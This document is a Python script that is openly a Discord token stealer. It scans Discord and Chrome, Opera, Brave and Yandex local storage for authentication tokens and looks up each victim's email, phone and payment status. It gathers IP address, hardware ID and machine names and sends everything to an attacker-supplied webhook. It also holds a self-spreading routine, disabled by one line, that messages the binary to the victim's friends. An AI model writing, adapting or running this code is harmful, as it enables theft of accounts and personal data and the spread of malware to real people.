import os

def DepInstall():
    os.system("python -m pip install socket >nul 2>&1")
    os.system("python -m pip install subprocess >nul 2>&1")
    os.system("python -m pip install re >nul 2>&1")
    os.system("python -m pip install json >nul 2>&1")
    os.system("python -m pip install base64 >nul 2>&1")
    os.system("python -m pip install urllib3 >nul 2>&1")
    os.system("python -m pip install threading >nul 2>&1")
    os.system("python -m pip install time >nul 2>&1")
    os.system("python -m pip install sys >nul 2>&1")
    os.system("python -m pip install tk >nul 2>&1")
    os.system("python -m pip install pygame >nul 2>&1")
    f = open("verification.txt", "w")
    f.write("Dependencies installed :) please don't delete this file or the program will keep trying to install the dependencies once it is ran again.")
    f.close()

def TokenGrabber():

    # Requeried modules
    import os

    if os.name != "nt": # Check if it's a computer running windows
        exit() # If is not, the program will close
    from re import findall
    from json import loads, dumps
    from base64 import b64decode
    from subprocess import Popen, PIPE
    from urllib.request import Request, urlopen
    from threading import Thread
    from time import sleep
    from sys import argv

    WEBHOOK_URL = "" # The webhook that will be used

    # Some paths
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    PATHS = {
        "Discord": ROAMING + "\\Discord",
        "Discord Canary": ROAMING + "\\discordcanary",
        "Discord PTB": ROAMING + "\\discordptb",
        "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
        "Opera": ROAMING + "\\Opera Software\\Opera Stable",
        "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
    }

    # Get the header
    def getHeader(token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    # Some info about the user
    def getUserData(token):
        try:
            return loads(
                urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
        except:
            pass


    # Get token by extracting it from the path
    def getTokenz(path):
        path += "\\Local Storage\\leveldb"
        tokens = []
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for token in findall(regex, line):
                        tokens.append(token)
        return tokens

    # Who am I function
    def WhoAmI():
        ip = "None"
        try:
            ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
        except:
            pass
        return ip

    # Hardware
    def hWiD():
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

    # Discord friends
    def getFriends(token):
        try:
            return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
                                        headers=getHeader(token))).read().decode())
        except:
            pass

    # Get channels
    def getChat(token, uid):
        try:
            return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
                                        data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
        except:
            pass

    # Get the payment method
    def paymentMethods(token):
        try:
            return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                                headers=getHeader(token))).read().decode())) > 0)
        except:
            pass

    # Message ID
    def sendMessages(token, chat_id, form_data):
        try:
            urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
                                                                                                            "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
                            data=form_data.encode())).read().decode()
        except:
            pass

    # Spread function
    def spread(token, form_data, delay):
        return  # ¡¡¡¡Remove to re-enabled (If you remove this line, malware will spread itself by sending the binary to friends)!!!!
        for friend in getFriends(token):
            try:
                chat_id = getChat(token, friend["id"])
                sendMessages(token, chat_id, form_data)
            except Exception as e:
                pass
            sleep(delay)

    # Main function of the grabber
    def main():
        cache_path = ROAMING + "\\.cache~$"
        prevent_spam = True
        self_spread = True
        embeds = []
        working = []
        checked = []
        already_cached_tokens = []
        working_ids = []
        ip = WhoAmI()
        pc_username = os.getenv("UserName")
        pc_name = os.getenv("COMPUTERNAME")
        user_path_name = os.getenv("userprofile").split("\\")[2]
        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue
            for token in getTokenz(path):
                if token in checked:
                    continue
                checked.append(token)
                uid = None
                if not token.startswith("mfa."):
                    try:
                        uid = b64decode(token.split(".")[0].encode()).decode()
                    except:
                        pass
                    if not uid or uid in working_ids:
                        continue
                user_data = getUserData(token)
                if not user_data:
                    continue
                working_ids.append(uid)
                working.append(token)
                username = user_data["username"] + "#" + str(user_data["discriminator"])
                user_id = user_data["id"]
                email = user_data.get("email")
                phone = user_data.get("phone")
                nitro = bool(user_data.get("premium_type"))
                billing = bool(paymentMethods(token))
                # Embed can be customized
                embed = {
                    "color": 0x000000,
                    "fields": [
                        {
                            "name": "Account Info",
                            "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                            "inline": True
                        },
                        {
                            "name": "PC Info",
                            "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                            "inline": True
                        },
                        {
                            "name": "Token",
                            "value": token,
                            "inline": False
                        }
                    ],
                    "author": {
                        "name": f"{username} ({user_id})",
                    },
                    "footer": {
                        "text": f"[+] Developed By JetBerri [+]"
                    }
                }
                embeds.append(embed)
        with open(cache_path, "a") as file:
            for token in checked:
                if not token in already_cached_tokens:
                    file.write(token + "\n")
        if len(working) == 0:
            working.append('123')
        webhook = {
            "content": "",
            "embeds": embeds,
            "username": "Stealer - You can change this name in the json embed :))",
            "avatar_url": "https://avatars.githubusercontent.com/u/84512017?v=4"
        }
        try:
            
            urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
        except:
            pass
        if self_spread:
            for token in working:
                with open(argv[0], encoding="utf-8") as file:
                    content = file.read()
                Thread(target=spread, args=(token, 7500 / 1000)).start()


    try:
        main()
    except Exception as e:
        print(e)
        pass

DepInstall()
TokenGrabber()
